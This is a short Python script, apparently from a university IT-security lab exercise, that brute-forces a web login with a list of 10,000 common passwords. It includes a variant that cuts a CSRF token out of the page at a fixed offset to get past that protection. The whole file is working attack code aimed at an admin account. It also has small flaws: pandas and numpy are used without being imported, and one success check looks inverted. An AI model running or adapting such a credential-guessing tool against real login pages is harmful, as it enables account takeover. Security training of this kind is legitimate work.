import requests

passwords = pd.read_csv("./10k-most-common.txt", header=None)

passwords = np.array(passwords)


def try_password(user_name : str, password : str):
    payload = {"usermail" : user_name, "password" : password}
    result =  requests.post("https://18c10a05d651af1115808e18a68c0d65.itsec-portal.informatik.uni-halle.de:8443/", data=payload)

    if  result.text.find("invalid") != -1:
            print("Das Passwort ist: ", password)
      
    return result

url = "https://74bf6a38053155f20180f6619e19a41c.itsec-portal.informatik.uni-halle.de:8443/account.php?login=pass"

def try_password_csrf(username: str, password : str):
    session = requests.Session()
    login = session.post("https://18c10a05d651af1115808e18a68c0d65.itsec-portal.informatik.uni-halle.de:8443/")

    csrf_size =len("e69c12e115ac24e97a496e0246e1eef8") # 32 stellen
  
    csrf_token = login.text[514:514+csrf_size]

    payload = {"user" : username, "password" : password, "csrf": csrf_token}
    #payload = {"user" : "admin", "password" : "hans", "csrf": csrf_token}
    
    result = session.post("https://18c10a05d651af1115808e18a68c0d65.itsec-portal.informatik.uni-halle.de:8443/",data = payload)
    
    if result.text.find("incorrect") == -1:
        print("Das Passwort ist: ", password)
    
    session.close()


def main():
    for pw in passwords:
        # try_password_csrf("admin", pw)

        try_password("admin@seattlesounds.net", pw)


main()